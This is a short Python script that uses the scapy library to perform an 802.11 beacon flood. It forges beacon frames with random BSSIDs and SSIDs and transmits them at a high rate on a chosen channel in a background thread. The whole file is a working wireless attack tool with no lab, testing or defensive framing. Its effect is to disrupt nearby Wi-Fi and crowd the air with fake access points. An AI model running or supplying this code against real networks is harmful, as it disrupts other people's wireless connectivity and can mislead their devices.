import threading, random, string, time
from scapy.all import *

def _random_mac():
    return ':'.join([f'{random.randint(0x00, 0xff):02x}' for _ in range(6)])

def _random_ssid(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def beacon_flood(iface, channel, rate=500, duration=60, counter=None):
    """
    Inject forged 802.11 Beacon frames at high rate.
    Each frame carries a unique random BSSID and SSID.
    """
    stop = threading.Event()
    if counter is None:
        counter = [0]

    def _flood():
        end = time.time() + duration
        while time.time() < end and not stop.is_set():
            bssid = _random_mac()
            ssid = _random_ssid()
            frame = (RadioTap() /
                     Dot11(type=0, subtype=8,
                           addr1="ff:ff:ff:ff:ff:ff",
                           addr2=bssid, addr3=bssid) /
                     Dot11Beacon(cap="ESS+privacy") /
                     Dot11Elt(ID="SSID", info=ssid) /
                     Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c") /
                     Dot11Elt(ID="DSset", info=bytes([channel])))
            sendp(frame, iface=iface, count=rate, inter=0, verbose=False)
            counter[0] += rate

    t = threading.Thread(target=_flood, daemon=True)
    t.start()
    print(f"[+] Beacon flood started on channel {channel} — rate: {rate} f/s, duration: {duration}s")
    return stop, counter